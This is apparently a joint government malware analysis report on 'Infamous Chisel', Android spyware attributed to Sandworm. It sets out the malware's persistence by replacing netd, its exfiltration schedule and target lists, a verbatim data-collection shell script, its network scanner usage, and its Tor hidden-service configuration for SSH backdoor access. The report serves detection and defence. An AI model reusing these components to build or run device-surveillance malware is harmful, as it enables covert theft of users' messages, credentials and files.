&lt;li&gt;It performs periodic scanning of files and network information for exfiltration.&lt;/li&gt;
&lt;li&gt;System and application configuration files are exfiltrated from an infected device.&lt;/li&gt;
&lt;li&gt;Infamous Chisel provides network backdoor access via a Tor (The Onion Router) hidden service and Secure Shell (SSH).&lt;/li&gt;
&lt;li&gt;Other capabilities include network monitoring, traffic collection, SSH access, network scanning, and SCP file transfer.&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Overview&lt;/h2&gt;
&lt;p&gt;The UK National Cyber Security Centre (NCSC), the U.S. National Security Agency (NSA), U.S. Cybersecurity and Infrastructure Security Agency (CISA), U.S. Federal Bureau of Investigation (FBI), New Zealand’s National Cyber Security Centre (NCSC-NZ), the Canadian Centre for Cyber Security – part of the Canada’s Communications Security Establishment (CSE), and Australian Signals Directorate (ASD) are aware that the actor known as Sandworm has used a new mobile malware in a campaign targeting Android devices used by the Ukrainian military. The malware is referred to here as Infamous Chisel.&lt;/p&gt;
&lt;p&gt;Organizations from the United Kingdom, United States, Australia, Canada, and New Zealand have previously linked the Sandworm actor to the Russian GRU's Main Centre for Special Technologies GTsST.&lt;/p&gt;

&lt;h2&gt;Malware Summary&lt;/h2&gt;
&lt;p&gt;Infamous Chisel is a collection of components which enable persistent access to an infected Android device over the Tor network, and which periodically collates and exfiltrates victim information from compromised devices. The information exfiltrated is a combination of system device information, commercial application information, and applications specific to the Ukrainian military.&lt;/p&gt;
&lt;p&gt;The malware periodically scans the device for information and files of interest, matching a predefined set of file extensions. It also contains functionality to periodically scan the local network collating information about active hosts, open ports, and banners.&lt;/p&gt;
&lt;p&gt;Infamous Chisel also provides remote access by configuring and executing Tor with a hidden service which forwards to a modified Dropbear binary providing a SSH connection.&lt;/p&gt;
&lt;p&gt;Other capability includes network monitoring and traffic collection, SSH access, network scanning, and SCP file transfer.&lt;/p&gt;

&lt;/tbody&gt;
&lt;/table&gt;

&lt;h2&gt;Functionality&lt;/h2&gt;
&lt;h3&gt;Overview&lt;/h3&gt;
&lt;p&gt;Infamous Chisel is a collection of multiple components. For &lt;code&gt;netd&lt;/code&gt;, &lt;code&gt;killer&lt;/code&gt;, &lt;code&gt;blob&lt;/code&gt;, and &lt;code&gt;td&lt;/code&gt; functionality can be extrapolated from references between them. The function of other binaries changes depending on the command line parameters that are supplied. It is likely that interaction takes place over the SSH remote shell connection configured by &lt;code&gt;netd&lt;/code&gt;.&lt;/p&gt;
&lt;h3&gt;Overview of the Components&lt;/h3&gt;
&lt;table class="tablesaw tablesaw-stack"&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;td&gt;
&lt;p&gt;&lt;strong&gt;Filename&lt;/strong&gt;&lt;/p&gt;
&lt;/td&gt;
&lt;td&gt;
&lt;p&gt;&lt;strong&gt;Description&lt;/strong&gt;&lt;/p&gt;
&lt;/td&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;
&lt;p&gt;netd&lt;/p&gt;
&lt;/td&gt;
&lt;td&gt;
&lt;p&gt;This component is used to perform automated device information collection and exfiltration.&lt;/p&gt;
&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;
&lt;p&gt;killer&lt;/p&gt;
&lt;/td&gt;
&lt;td&gt;
&lt;p&gt;This component kills the malicious netd process.&lt;/p&gt;
&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;
&lt;p&gt;blob&lt;/p&gt;
&lt;/td&gt;
&lt;td&gt;
&lt;p&gt;This component is executed by netd and is responsible for configuring and executing the Tor utility td.&lt;/p&gt;
&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;
&lt;p&gt;td&lt;/p&gt;
&lt;/td&gt;
&lt;td&gt;
&lt;p&gt;This utility is Tor with no obvious modifications.&lt;/p&gt;
&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;
&lt;p&gt;tcpdump&lt;/p&gt;
&lt;/td&gt;
&lt;td&gt;
&lt;p&gt;This utility is tcpdump with no obvious modifications.&lt;/p&gt;
&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;
&lt;p&gt;ndbr_armv7l ndbr_i686&lt;/p&gt;
&lt;/td&gt;
&lt;td&gt;
&lt;p&gt;These utilities are multi-call containing:&lt;/p&gt;
&lt;p&gt;dropbear, dropbearkey, ssh, scp, nmap, dbclient, watchdog, rmflag, mkflag. dropbear has been modified as described in the section Mutli-call binaries (Dropbear function modifications). ARM and x86 variants.&lt;/p&gt;
&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;
&lt;p&gt;db&lt;/p&gt;
&lt;/td&gt;
&lt;td&gt;
&lt;p&gt;This utility is multi-call containing:&lt;/p&gt;
&lt;p&gt;dropbear, dropbearkey, ssh, scp, nmap, dbclient, watchdog, rmflag, mkflag. dropbear has been modified as described in the section Mutli-call binaries (Dropbear function modifications).&lt;/p&gt;
&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;

&lt;h3&gt;Persistence&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;netd&lt;/code&gt; is designed to persist on the system by replacing the legitimate &lt;code&gt;netd&lt;/code&gt; system binary at the path &lt;code&gt;/system/bin/netd&lt;/code&gt;. This replacement is not carried out by the malware, but it can be extrapolated from the checks that it carries out. This is the only Infamous Chisel component which persists.&lt;/p&gt;
&lt;p&gt;When the malicious &lt;code&gt;netd&lt;/code&gt; is executed, it will check if &lt;code&gt;init&lt;/code&gt; is the parent process which executed it. This parent process is responsible for creating the processes listed in the script &lt;code&gt;init.rc&lt;/code&gt;. The malicious replacement netd when executed in this way will fork and execute the legitimate process backed up at the path&amp;nbsp;&lt;code&gt;/system/bin/netd_&lt;/code&gt;&amp;nbsp;passing through the command line parameters. This retains the normal functionality of &lt;code&gt;netd&lt;/code&gt;, while allowing the malicious &lt;code&gt;netd&lt;/code&gt; to execute as root. This replacement would require an escalated privilege level to perform.&lt;/p&gt;
&lt;p&gt;If it doesn’t find itself at the &lt;code&gt;/system/bin/netd&lt;/code&gt; path, it will fork and set its parent process ID to &lt;code&gt;1&lt;/code&gt;, also attempting to kill the legitimate &lt;code&gt;netd&lt;/code&gt; process.&lt;/p&gt;

&lt;h2&gt;Components&lt;/h2&gt;
&lt;h3&gt;netd&lt;/h3&gt;
&lt;p&gt;The &lt;code&gt;netd&lt;/code&gt; component of Infamous Chisel provides the bulk of the custom functionality which the actor deploys. The main purpose of &lt;code&gt;netd&lt;/code&gt; is to collate and exfiltrate information from the compromised device at set intervals. It uses a combination of shell scripts and commands to collect device information. It also searches multiple directories to which files matching a predefined set of extensions are exfiltrated.&lt;/p&gt;
&lt;h4&gt;Exfiltration Logic&lt;/h4&gt;


&lt;p&gt;All file exfiltration is performed as detailed in the Communications (File exfiltration)&amp;nbsp;Section of this report. Whenever a file is selected for exfiltration, it is MD5-hashed and cross-referenced with a list of previously sent file hashes held in a file at one of three locations supporting different Android versions. The first existing directory path will be used:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;/sdcard/Android/data/.google.index&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/storage/emulated/0/Android/data/.google.index&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/storage/emulated/1/Android/data/.google.index&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;The file exfiltration is considered complete when the server sends &lt;code&gt;Success&lt;/code&gt; anywhere in its response. As this exfiltration uses a Hypertext Transfer Protocol (HTTP) POST, this server response is also expected to be HTTP, but this is not explicitly checked for.&lt;/p&gt;
&lt;p&gt;The 16 raw bytes of the MD5 are appended to the end of the &lt;code&gt;.google.index file&lt;/code&gt;, ensuring that the same file isn’t sent multiple times. As the &lt;code&gt;.google.index&lt;/code&gt; file contains raw bytes, without prior knowledge, it would appear to contain random data. The initial allocation size is 256 Kb filled with NULLs providing space for up to a maximum of 16,384 file hashes. All hash entries will be checked for every file prior to exfiltration.&lt;/p&gt;
&lt;p&gt;When the end of the &lt;code&gt;.google.index&lt;/code&gt; file is reached, the position is reset to the start, overwriting the previous hashes. This means if the number of files to exfiltrate from the device exceeds 16,384, files will be sent multiple times.&lt;/p&gt;
&lt;h4&gt;Information Gathering&lt;/h4&gt;
&lt;p&gt;On execution, the Infamous Chisel &lt;code&gt;netd&lt;/code&gt; component enters a main loop that executes indefinitely where various timers trigger the execution of different tasks. All timer actions are executed immediately on first execution, and then at the specific intervals.&lt;/p&gt;
&lt;h5&gt;File and Device Information Exfiltration&lt;/h5&gt;
&lt;p&gt;Every 86,000 seconds (23 hours, 53 minutes, and 20 seconds) the following actions are performed:&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;1. File exfiltration from data directories&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;The following directories are recursively searched for files matching the extensions listed. When a file is found by this search, it is exfiltrated as detailed in the Communications (File exfiltration) Section of this report.&lt;/p&gt;
&lt;p&gt;File extension list:&lt;/p&gt;
&lt;table&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;.dat, .bak, .xml, .txt, .ovpn, .xml, wa.db, msgstore.db, .pdf, .xlsx, .csv, .zip, telephony.db, .png, .jpg, .jpeg, .kme, database.hik, database.hik-journal, ezvizlog.db, cache4.db, contacts2.db, .ocx, .gz, .rar, .tar, .7zip, .zip, .kmz, locksettings.db, mmssms.db, telephony.db, signal.db, mmssms.db, profile.db, accounts.db, PyroMsg.DB, .exe, .kml&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;Directory list:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;/sdcard&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/storage/emulated/0/&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/data/media&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/data/data/de.blinkt.openvpn&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/data/data/org.thoughtcrime.securesms&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/data/data/net.openvpn.openvpn&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/data/data/org.telegram.messenger&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/data/data/vpn.fastvpn.freevpn&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/data/data/eu.thedarken.wldonate&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/data/data/com.android.providers.contacts&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/data/data/com.android.providers.telephony&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/data/data/com.google.android.gm&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/data/system/users/0/&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Along with other military specific application directories.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;2. Information collection script&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;An information collection script collates various hardware configuration information about the device.&lt;/p&gt;
&lt;p&gt;The script is written to the location: &lt;code&gt;/data/local/tmp/.android.cache.sh&lt;/code&gt; and then executed by &lt;code&gt;netd&lt;/code&gt; using the command &lt;code&gt;/system/bin/sh -c /data/local/tmp/.android.cache.sh&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;.android.cache.sh&lt;/code&gt; contains the following shell script:&lt;/p&gt;
&lt;table&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;
&lt;p&gt;#!/system/bin/sh&lt;/p&gt;
&lt;p&gt;system/bin/&lt;a&gt;settings get secure android_id&lt;/a&gt; &amp;gt; /data/local/tmp/.aid.cache&lt;/p&gt;
&lt;p&gt;system/bin/ip a &amp;gt; /data/local/tmp/.syscache.csv&lt;/p&gt;
&lt;p&gt;system/bin/pm list packages &amp;gt; /data/local/tmp/.syspackages.csv&lt;/p&gt;
&lt;p&gt;system/bin/getprop &amp;gt; /data/local/tmp/&lt;a&gt;.sysinfo.csv&lt;/a&gt;&lt;/p&gt;
&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;table class="tablesaw tablesaw-stack"&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;td&gt;
&lt;p&gt;&lt;strong&gt;Command&lt;/strong&gt;&lt;/p&gt;
&lt;/td&gt;
&lt;td&gt;
&lt;p&gt;&lt;strong&gt;Description&lt;/strong&gt;&lt;/p&gt;
&lt;/td&gt;
&lt;td&gt;
&lt;p&gt;&lt;strong&gt;Output filename&lt;/strong&gt;&lt;/p&gt;
&lt;/td&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;
&lt;p&gt;settings get secure android_id&lt;/p&gt;
&lt;/td&gt;
&lt;td&gt;
&lt;p&gt;Returns a hexadecimal string identifying the device uniquely.&lt;/p&gt;
&lt;/td&gt;
&lt;td&gt;
&lt;p&gt;.aid.cache&lt;/p&gt;
&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;
&lt;p&gt;ip a&lt;/p&gt;
&lt;/td&gt;
&lt;td&gt;
&lt;p&gt;Lists networking information such as IP address, subnet and interface type on a per network interface basis.&lt;/p&gt;
&lt;/td&gt;
&lt;td&gt;
&lt;p&gt;.syscache.csv&lt;/p&gt;
&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;
&lt;p&gt;pm list packages&lt;/p&gt;
&lt;/td&gt;
&lt;td&gt;
&lt;p&gt;List of installed applications on the device.&lt;/p&gt;
&lt;/td&gt;
&lt;td&gt;
&lt;p&gt;.syspackages.csv&lt;/p&gt;
&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;
&lt;p&gt;getprop&lt;/p&gt;
&lt;/td&gt;
&lt;td&gt;
&lt;p&gt;Lists various device hardware information such as GPS, battery, manufacturer and language.&lt;/p&gt;
&lt;/td&gt;
&lt;td&gt;
&lt;p&gt;.sysinfo.csv&lt;/p&gt;
&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;All the information is written to the various files in the &lt;code&gt;/data/local&lt;/code&gt; directory and exfiltrated, with the exception of the &lt;code&gt;.aid.cache&lt;/code&gt; file. The &lt;code&gt;android_id&lt;/code&gt; contained within this file is used to form part of the Uniform Resource Identifier (URI) detailed in the Communications&amp;nbsp;Section of this report.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;3. File exfiltration from application directories&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;The &lt;code&gt;/data/&lt;/code&gt; directory is searched for the application directories:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;com.google.android.apps.authenticator2&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;net.openvpn.openvpn&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;free.vpn.unblock.proxy.vpnmaster&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;com.UCMobile.intl&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;com.brave.browser&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;com.opera.browser&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;com.hisense.odinbrowser&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;com.dzura&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;com.google.android.apps.docs&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;com.sec.android.app.myfiles&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;com.microsoft.skydrive&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;com.google.android.apps.walletnfcrel&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;com.paypal.android.p2pmobile&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;com.binance.dev&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;com.coinbase.android&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;com.wallet.crypto.trustapp&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;com.viber.voip&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;com.dropbox.android&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;com.android.providers.telephony&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;com.android.providers.contacts&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;com.cxinventor.file.explorer&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;com.elinke.fileserver&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;org.mozilla.firefox&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;com.whatsapp&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;org.thoughtcrime.securesms&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;org.telegram.messenger&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;org.telegram.messenger.web&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;com.discord&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;com.hikvisionsystems.app&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;com.hikvision.hikconnect&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;com.skype.raider&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;com.google.android.gm&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;com.android.chrome&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;org.chromium.webview_shell&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;keystore&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Along with some military application specific directories.&lt;/p&gt;
&lt;p&gt;Every file in these directories regardless of type is exfiltrated.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;4. Specific file exfiltration&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;The following files at the absolute paths are exfiltrated:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;/data/local/tmp/.syscache.csv&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/data/local/tmp/.syspackages.csv&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/data/local/tmp/.sysinfo.csv&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/data/system/users/0/settings_ssaid.xml&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Along with some military application specific directories.&lt;/p&gt;
&lt;p&gt;The files with the extension &lt;code&gt;.csv&lt;/code&gt; are generated by the malware. The others are application specific files or system configuration information.&lt;/p&gt;
&lt;h5&gt;Exfiltration of Configuration and Configuration Backup Files&lt;/h5&gt;
&lt;p&gt;Every 600 seconds (10 minutes) the following directories are searched for files of type &lt;code&gt;.json&lt;/code&gt; or &lt;code&gt;.json.bak&lt;/code&gt; which are then immediately exfiltrated:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;/sdcard&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/storage/emulated/0/&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/data/media&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/data/data/de.blinkt.openvpn&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/data/data/org.thoughtcrime.securesms&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/data/data/net.openvpn.openvpn&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/data/data/org.telegram.messenger&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/data/data/vpn.fastvpn.freevpn&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/data/data/eu.thedarken.wldonate&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/data/data/com.android.providers.contacts&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/data/data/com.android.providers.telephony&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/data/data/com.google.android.gm&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/data/system/users/0/&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Along with some military application specific directories.&lt;/p&gt;
&lt;h5&gt;Local Area Network Scanning&lt;/h5&gt;
&lt;p&gt;Every 172,000 seconds (1 day, 23 hours, 46 minutes, and 20 seconds) the local area network is scanned.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;netd&lt;/code&gt; has a built-in network scanner that is executed by the command line:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;netd minmap -i any -noping -o /data/local/tmp/.ndata.tmp/&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;The ping scanner is fairly simplistic and will iterate over the available host IP addresses in the subnet specified by the interface on all available Transmission Control Protocol (TCP) ports. Internet Control Message Protocol (ICMP) scanning is disabled due to the &lt;code&gt;noping&lt;/code&gt; command line parameter specified.&lt;/p&gt;
&lt;p&gt;The scanner also includes a HTTP GET request to elicit responses from ports running a HTTP server. The responses from other ports are also logged.&lt;/p&gt;

&lt;p&gt;&lt;em&gt;&lt;strong&gt;Note:&lt;/strong&gt; This information would facilitate lateral movement within the network and illustrates a clear intention to interact with other nearby hosts.&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;On completion of this scan, the &lt;code&gt;.ndata.tmp&lt;/code&gt; file is moved to the filename &lt;code&gt;.ndata.csv&lt;/code&gt; in the same directory. This file is exfiltrated immediately, and both files removed from the tmp directory.&lt;/p&gt;
&lt;p&gt;The contents of this file will appear similar to:&lt;/p&gt;
&lt;table&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;
&lt;p&gt;INTERFACE = eth0&lt;/p&gt;
&lt;p&gt;SOURCE = 192.168.0.2&lt;/p&gt;
&lt;p&gt;IP begin = 192.168.0.0&lt;/p&gt;
&lt;p&gt;IP end = 192.168.0.255&lt;/p&gt;
&lt;p&gt;PORTS =&lt;/p&gt;
&lt;p&gt;PING off&lt;/p&gt;
&lt;p&gt;SCAN tcp&lt;/p&gt;
&lt;p&gt;*******start*scan********&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;Host 192.168.0.0:&lt;/p&gt;
&lt;p&gt;Host 192.168.0.1:&lt;/p&gt;
&lt;p&gt;tcp - 135:[&lt;/p&gt;
&lt;p&gt;tcp - 139:[&lt;/p&gt;
&lt;p&gt;tcp - 443:[&lt;/p&gt;
&lt;p&gt;tcp - 445:[&lt;/p&gt;
&lt;p&gt;Host 192.168.0.2:&lt;/p&gt;
&lt;p&gt;Host 192.168.0.3:&lt;/p&gt;
&lt;p&gt;Host 192.168.0.4:&lt;/p&gt;
&lt;p&gt;&amp;lt;Remaining hosts omitted for brevity&amp;gt;&lt;/p&gt;
&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;The following command line parameters are present, but only a small portion is used:&lt;/p&gt;
&lt;table&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;
&lt;p&gt;-ip, -p, -o, -i, -noping, -udp, -n, -s, -t, -c, -h, --help&lt;/p&gt;
&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;Command line help is also included:&lt;/p&gt;
&lt;table&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;
&lt;p&gt;Usage minmap -ip* &amp;lt;ip-addr: 192.168.0.1/ip-range: 192.168.0.0/24&amp;gt; -p* &amp;lt;port: 80/port-range: 22,25-125/top&amp;gt; -udp &amp;lt;default tcp&amp;gt; -noping &amp;lt;default yes&amp;gt; -o &amp;lt;out_file&amp;gt; -t &amp;lt;timeout&amp;gt; &amp;lt;-n&amp;gt; -c &amp;lt;try_count&amp;gt; -s &amp;lt;source ip&amp;gt; -i &amp;lt;interface/any&amp;gt; &amp;lt;-h/--help (print this help)&lt;/p&gt;
&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h3&gt;td&lt;/h3&gt;
&lt;p&gt;The &lt;code&gt;td&lt;/code&gt; utility provides Tor directory services and is compiled for ARM with no obvious modifications. The configuration for this is generated by the &lt;code&gt;blob&lt;/code&gt; component, used for Tor management, described in the Components (blob) section, and saved at the path &lt;code&gt;/data/local/prx.cfg&lt;/code&gt;. This file contains:&lt;/p&gt;
&lt;table&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;SocksPort 127.0.0.1:1129 PreferSOCKSNoAuth%sExitPolicy reject *:*&lt;/p&gt;
&lt;p&gt;DataDirectory /data/local/prx/&lt;/p&gt;
&lt;p&gt;RunAsDaemon 1&lt;/p&gt;
&lt;p&gt;HiddenServiceDir /data/local/prx/hs/&lt;/p&gt;
&lt;p&gt;HiddenServicePort 34371 127.0.0.1:34371&lt;/p&gt;
&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;This configuration provides a Socket Secure version 4 (SOCKS4) connection on the local port &lt;code&gt;1129&lt;/code&gt; enabling the Tor network to be used. The &lt;code&gt;blob&lt;/code&gt; component uses this for network connectivity checks.&lt;/p&gt;
&lt;p&gt;The hidden service port is set to &lt;code&gt;34371&lt;/code&gt; with the directory for hidden service information being set to &lt;code&gt;/data/local/prx/hs/&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;During the execution of &lt;code&gt;td&lt;/code&gt; an &lt;code&gt;.onion&lt;/code&gt; domain for a hidden service is randomly generated at the path &lt;code&gt;/data/local/prx/hs/hostname&lt;/code&gt; which is then exfiltrated by &lt;code&gt;netd&lt;/code&gt;. The &lt;code&gt;db&lt;/code&gt; component performs further configuration detailed in the Multi-call binaries (Watchdog)&amp;nbsp;section of this report to enable a SSH connection via this &lt;code&gt;.onion&lt;/code&gt; domain. This gives the actor the ability to create an SSH session by connecting to the hidden service across Tor.&lt;/p&gt;
&lt;h3&gt;blob&lt;/h3&gt;
&lt;p&gt;The &lt;code&gt;blob&lt;/code&gt; component is responsible for configuring Tor services and checking network connectivity. Every 15 seconds the &lt;code&gt;tmp&lt;/code&gt; directory is checked for the &lt;code&gt;blob&lt;/code&gt; utility, and if found, it is moved to the &lt;code&gt;/data/local&lt;/code&gt; directory from the &lt;code&gt;/data/local/tmp/blob&lt;/code&gt; directory, overwriting any existing version. Every 6,000 seconds (1 hour and 40 minutes) &lt;code&gt;blob&lt;/code&gt; is then run from the &lt;code&gt;/data/local&lt;/code&gt; directory.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;netd&lt;/code&gt; executes &lt;code&gt;blob&lt;/code&gt; which is responsible for configuring and executing Tor services provided by &lt;code&gt;td&lt;/code&gt;. When run, it performs the following actions:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Checks local host for the port &lt;code&gt;1129&lt;/code&gt; being open, exiting if it is.&lt;/li&gt;
&lt;li&gt;Checks for the existence of &lt;code&gt;/data/local/td&lt;/code&gt;. If this is not present, extracts it from &lt;code&gt;/data/local/td.bz2&lt;/code&gt; (bzip2 compressed data).&lt;/li&gt;
&lt;li&gt;Creates the configuration file at the path: &lt;code&gt;/data/local/prx.cfg&lt;/code&gt;.&amp;nbsp;The contents of which are detailed in the Components (td)&amp;nbsp;section above.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;td&lt;/code&gt; is executed with this configuration file being supplied with the &lt;code&gt;-f&lt;/code&gt; command line parameter: &lt;code&gt;/data/local/td -f /data/local/prx.cfg&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;db&lt;/code&gt; the modified Dropbear SSH utility is checked for at the path &lt;code&gt;/data/local/db&lt;/code&gt;. If this file is not present, it is extracted from &lt;code&gt;/data/local/db.bz2&lt;/code&gt;. db is then executed immediately after, with no command line parameters being passed.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;blob&lt;/code&gt; then enters a loop where it performs a network connectivity check against the domain &lt;code&gt;www.geodatatool[.]com&lt;/code&gt; connecting on the local SOCKS4 address provided by the td utility &lt;code&gt;127.0.0[.]1:1129&lt;/code&gt; every 3 minutes.&lt;/li&gt;
&lt;li&gt;It checks the second byte of the response from this domain to be the character &lt;code&gt;Z (0x5a)&lt;/code&gt; to validate a legitimate response has been received from the server. Nothing further is done with the data; this is simply an internet connection check.&lt;/li&gt;
&lt;li&gt;If this request fails or the server doesn’t return the expected data, &lt;code&gt;blob&lt;/code&gt; terminates the execution of &lt;code&gt;td&lt;/code&gt;.&lt;/li&gt;
&lt;/ol&gt;
